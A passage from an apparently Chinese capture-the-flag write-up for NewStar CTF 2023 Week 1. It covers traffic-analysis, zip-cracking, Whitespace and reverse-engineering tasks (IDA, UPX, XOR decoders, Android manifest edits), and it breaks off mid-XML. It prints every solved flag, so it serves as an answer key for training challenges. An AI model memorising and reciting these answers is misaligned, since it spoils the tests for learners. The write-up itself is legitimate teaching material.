class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 11 </span><span class="hljs-number"> 2021 </span>boot<br>drwxr-xr-x  <span class="hljs-number"> 5 </span>root root <span class="hljs-number"> 360 </span>Aug<span class="hljs-number"> 19 </span>06:08 dev<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 19 </span>06:08 etc<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 11 </span><span class="hljs-number"> 2021 </span>home<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 21 </span><span class="hljs-number"> 2021 </span>lib<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>lib64<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>media<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>mnt<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>opt<br>dr-xr-xr-x<span class="hljs-number"> 248 </span>root root   <span class="hljs-number"> 0 </span>Aug<span class="hljs-number"> 19 </span>06:08 proc<br>drwx------  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 19 </span>06:17 root<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 21 </span><span class="hljs-number"> 2021 </span>run<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 21 </span><span class="hljs-number"> 2021 </span>sbin<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>srv<br>dr-xr-xr-x <span class="hljs-number"> 13 </span>root root   <span class="hljs-number"> 0 </span>Aug<span class="hljs-number"> 19 </span>06:08 sys<br>drwxrwxrwt  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 21 </span><span class="hljs-number"> 2021 </span>tmp<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span>usr<br>drwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 21 </span><span class="hljs-number"> 2021 </span>var<br></code></pre></td></tr></table></figure><p>发现啊flag名字<code>.ffffllllllll11111144444GGGGGG</code></p><p>启动过滤器<code>frame contains ffffllllllll11111144444GGGGGG</code>，追踪HTTP流，看到flag的两次base64编码：<code>Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=</code>，base64解密两次得到：<code>flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</code></p><h3 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h3><p>下载后发现打不开</p><p>使用binwalk，<code>binwalk -e task_1 </code>，得到一个压缩包，bandizip打开发现base64编码的注释<code>SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==</code>，base64解密后得到<code>I like six-digit numbers because they are very concise and easy to remember.</code>，拿爆破工具直接爆破密码，得到232311，拿到flag：<code>flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</code></p><h3 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h3><p>下载后发现都是空格、Tab和换行，联想到WhiteSpace语言，在网上随便找一个WhiteSpace在线运行环境<a href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace">whitespace在线运行,在线工具，在线编译IDE_w3cschool</a>，运行得到flag：<code>flag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125;</code></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>解题 7&#x2F;8</p><h3 id="easy-RE"><a href="#easy-RE" class="headerlink" title="easy_RE"></a>easy_RE</h3><p>下载程序，拖到ida里面打开，能看见flag的前半部分<code>flag&#123;we1c0m</code></p><img src="/2023/09/26/2023newstarctfWeek1/re1_up.png" class=""><p>F5反编译，看到后半部分<code>e_to_rev3rse!!&#125;</code>，得到完整flag：<code>flag&#123;we1c0me_to_rev3rse!!&#125;</code></p><h3 id="咳"><a href="#咳" class="headerlink" title="咳"></a>咳</h3><p>Upx脱壳<code>upx -d KE.exe</code></p><p>反编译代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 i; <span class="hljs-comment">// r10</span><br>  <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// kr00_8</span><br>  <span class="hljs-type">char</span> Str1[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-88h] BYREF</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+80h] [rbp-28h]</span><br><br>  _main();<br>  <span class="hljs-built_in">memset</span>(Str1, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(Str1));<br>  v7 = <span class="hljs-number">0</span>;<br>  Hello();<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, Str1);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>i64; ; ++i )<br>  &#123;<br>    v4 = &amp;Str1[<span class="hljs-built_in">strlen</span>(Str1)];<br>    <span class="hljs-keyword">if</span> ( i &gt;= v4 - Str1 )<br>      <span class="hljs-keyword">break</span>;<br>    ++Str1[i];<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(Str1, enc, v4 - Str1) )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;WOW!!&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I believe you can do it!&quot;</span>);<br>  system(<span class="hljs-string">&quot;pause&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中enc是<code>gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~</code>，</p><p>写一个python脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到flag：<code>flag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125;</code></p><h3 id="Segments"><a href="#Segments" class="headerlink" title="Segments"></a>Segments</h3><p>下载附件，拖到ida里，提示shift+F7，直接按，发现段名字中藏着flag</p><img src="/2023/09/26/2023newstarctfWeek1/re2.png" class=""><p><code>flag&#123;You_ar3_g0od_at_f1nding_ELF_segments_name&#125;</code></p><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p>反编译，得到c代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">char</span> *s1; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span><br>  <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> *s; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br><br>  s = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x64</span>uLL);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input flag: &quot;</span>);<br>  fgets(s, <span class="hljs-number">100</span>, <span class="hljs-built_in">stdin</span>);<br>  s[<span class="hljs-built_in">strcspn</span>(s, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-number">0</span>;<br>  v6 = (<span class="hljs-type">char</span> *)encode(s);<br>  v3 = <span class="hljs-built_in">strlen</span>(v6);<br>  s1 = (<span class="hljs-type">char</span> *)base64_encode(v6, v3);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;</span>) )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Correct&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong&quot;</span>);<br>  <span class="hljs-built_in">free</span>(v6);<br>  <span class="hljs-built_in">free</span>(s1);<br>  <span class="hljs-built_in">free</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现base64，对字符串进行解密</p><p>得到<code>V\QWkt $_e&#39;^_ggXQ&#39;u|v!c/m</code></p><p>分析encode函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">_BYTE *__fastcall <span class="hljs-title function_">encode</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  _BYTE *v4; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+2Ch] [rbp-14h]</span><br><br>  v1 = <span class="hljs-built_in">strlen</span>(a1);<br>  v4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2</span> * v1 + <span class="hljs-number">1</span>);<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(a1); ++i )<br>  &#123;<br>    v2 = v6++;<br>    v4[v2] = (a1[i] ^ <span class="hljs-number">0x20</span>) + <span class="hljs-number">16</span>;<br>  &#125;<br>  v4[v6] = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>写出python解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;V\QWkt $_e\&#x27;^_ggXQ\&#x27;u|v!c/m&#x27;</span><br>b=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    b+=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">16</span>)^<span class="hljs-number">0x20</span>)<br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure><p>得到flag：<code>flag&#123;D04ou7nowwha7ELF1s?&#125;</code></p><h3 id="Endian"><a href="#Endian" class="headerlink" title="Endian"></a>Endian</h3><p>反编译，得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">char</span> *v5; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v7 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input your flag&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, v6);<br>  v5 = v6;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_DWORD *)v5 != (<span class="hljs-built_in">array</span>[i] ^ <span class="hljs-number">0x12345678</span>) )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong!&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    v5 += <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you are right&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中array为<code>dd 75553A1Eh, 7B583A03h, 4D58220Ch, 7B50383Dh, 736B3819h, 0</code>，shift+e提取数组元素，写出python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">arrr=[ <span class="hljs-number">1968519710</span>, <span class="hljs-number">2069379587</span>, <span class="hljs-number">1297621516</span>, <span class="hljs-number">2068854845</span>, <span class="hljs-number">1936406553</span>, <span class="hljs-number">0</span> ]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arrr:<br>    h=((i^<span class="hljs-number">0x12345678</span>))<br>    value = h<br><br>    nums = []<br>    <span class="hljs-keyword">while</span> value &gt; <span class="hljs-number">0</span>:<br>        nums.append(<span class="hljs-built_in">hex</span>(value &amp; <span class="hljs-number">0xFF</span>)) <span class="hljs-comment"># 取出低位部分，并转换为16进制字符串</span><br>        value &gt;&gt;= <span class="hljs-number">8</span> <span class="hljs-comment"># 右移8位，获取下一个位置的部分</span><br>    nums_str = [<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(num,<span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> nums]<br>    result_str = <span class="hljs-string">&#x27;&#x27;</span>.join(nums_str)<br>    <span class="hljs-built_in">print</span>(result_str,end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>执行拿到flag：<code>flag&#123;llittl_Endian_axV4</code></p><p>修改一下得到最后flag：<code>flag&#123;llittl_Endian_a&#125;</code></p><h3 id="AndroXor"><a href="#AndroXor" class="headerlink" title="AndroXor"></a>AndroXor</h3><p>Android killer打开，java反编译，入口处com.chick.androxor.MainActivity得到关键函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">Xor</span><span class="hljs-params">(String paramString1, String paramString2)</span><br> &#123;<br>   <span class="hljs-type">char</span>[] arrayOfChar = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[paramString1.length()];<br>   <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> paramString1.length();<br>   <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;wrong!!!&quot;</span>;<br>   String str2;<br>   <span class="hljs-keyword">if</span> (i != <span class="hljs-number">25</span>) &#123;<br>     str2 = <span class="hljs-string">&quot;wrong!!!&quot;</span>;<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>     str2 = <span class="hljs-string">&quot;you win!!!&quot;</span>;<br>   &#125;<br>   <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; paramString1.length(); i++)<br>   &#123;<br>     <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> (<span class="hljs-type">char</span>)(paramString1.charAt(i) ^ paramString2.charAt(i % paramString2.length()));<br>     arrayOfChar[i] = ((<span class="hljs-type">char</span>)j);<br>     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[] &#123; <span class="hljs-number">14</span>, <span class="hljs-number">13</span>, <span class="hljs-number">17</span>, <span class="hljs-number">23</span>, <span class="hljs-number">2</span>, <span class="hljs-number">75</span>, <span class="hljs-number">73</span>, <span class="hljs-number">55</span>, <span class="hljs-number">32</span>, <span class="hljs-number">30</span>, <span class="hljs-number">20</span>, <span class="hljs-number">73</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">62</span>, <span class="hljs-number">40</span>, <span class="hljs-number">64</span>, <span class="hljs-number">11</span>, <span class="hljs-number">39</span>, <span class="hljs-number">75</span>, <span class="hljs-number">89</span>, <span class="hljs-number">25</span>, <span class="hljs-number">65</span>, <span class="hljs-number">13</span> &#125;[i] != j)<br>     &#123;<br>       str2 = str1;<br>       <span class="hljs-keyword">break</span>;<br>     &#125;<br>   &#125;<br>   <span class="hljs-keyword">return</span> str2;<br> &#125;<br></code></pre></td></tr></table></figure><p>在com.chick.androxor.MainActivity$1类中得到key为happyx3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View paramView)</span><br> &#123;<br>   <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.val$password.getText().toString();<br>   paramView = <span class="hljs-built_in">this</span>.<span class="hljs-built_in">this</span>$<span class="hljs-number">0</span>;<br>   Toast.makeText(paramView, paramView.Xor(str, <span class="hljs-string">&quot;happyx3&quot;</span>), <span class="hljs-number">1</span>).show();<br>   Log.d(<span class="hljs-string">&quot;输入&quot;</span>, <span class="hljs-built_in">this</span>.val$password.getText().toString());<br> &#125;<br></code></pre></td></tr></table></figure><p>编写python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">key = <span class="hljs-string">&quot;happyx3&quot;</span><br>cipher = [<span class="hljs-number">14</span>, <span class="hljs-number">13</span>, <span class="hljs-number">17</span>, <span class="hljs-number">23</span>, <span class="hljs-number">2</span>, <span class="hljs-number">75</span>, <span class="hljs-number">73</span>, <span class="hljs-number">55</span>, <span class="hljs-number">32</span>, <span class="hljs-number">30</span>, <span class="hljs-number">20</span>, <span class="hljs-number">73</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">62</span>, <span class="hljs-number">40</span>, <span class="hljs-number">64</span>, <span class="hljs-number">11</span>, <span class="hljs-number">39</span>, <span class="hljs-number">75</span>, <span class="hljs-number">89</span>, <span class="hljs-number">25</span>, <span class="hljs-number">65</span>, <span class="hljs-number">13</span>]<br><br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)):<br>    result += <span class="hljs-built_in">chr</span>(cipher[i] ^ <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)]))<br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>得到flag：<code>flag&#123;3z_And0r1d_X0r_x1x1&#125;</code></p><h3 id="lazy-activtiy"><a href="#lazy-activtiy" class="headerlink" title="lazy_activtiy"></a>lazy_activtiy</h3><p>安装apk后打开发现要求我们打开另一个Activity来获得flag</p><p>查看apk配置文件AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span> standalone=<span class="hljs-string">&quot;no&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="hljs-attr">android:compileSdkVersion</span>=<span class="hljs-string">&quot;32&quot;</span> <span class="hljs-attr">android:compileSdkVersionCodename</span>=<span class="hljs-string">&quot;12&quot;</span> <span class="hljs-attr">package</span>=<span class="hljs-string">&quot;com.droidlearn.activity_travel&quot;</span> <span class="hljs-attr">platformBuildVersionCode</span>=<span class="hljs-string">&quot;32&quot;</span> <span class="hljs-attr">platformBuildVersionName</span>=<span class="hljs-string">&quot;12&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">application</span> <span class="hljs-attr">android:allowBackup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:appComponentFactory</span>=<span class="hljs-string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="hljs-attr">android:dataExtractionRules</span>=<span class="hljs-string">&quot;@xml/data_extraction_rules&quot;</span> <span class="hljs-attr">android:fullBackupContent</span>=<span class="hljs-string">&quot;@xml/backup_rules&quot;</span> <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher&quot;</span> <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/app_name&quot;</span> <span class="hljs-attr">android:roundIcon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="hljs-attr">android:supportsRtl</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@style/Theme.Activity_Travel&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.droidlearn.activity_travel.MainActivity&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></td></tr></table></figure><p>将入口处改为FlagActivity，并且把FlagActivity的exported改为true</p><p>改后xml文件如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span> standalone=<span class="hljs-string">&quot;no&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="hljs-attr">android:compileSdkVersion</span>=<span class="hljs-string">&quot;32&quot;</span> <span class="hljs-attr">android:compileSdkVersionCodename</span>=<span class="hljs-string">&quot;12&quot;</span> <span class="hljs-attr">package</span>=<span class="hljs-string">&quot;com.droidlearn.activity_travel&quot;</span> <span class="hljs-attr">platformBuildVersionCode</span>=<span class="hljs-string">&quot;32&quot;</span> <span class="hljs-attr">platformBuildVersionName</span>=<span class="hljs-string">&quot;12&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">application</span> <span class="hljs-attr">android:allowBackup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:appComponentFactory</span>=<span 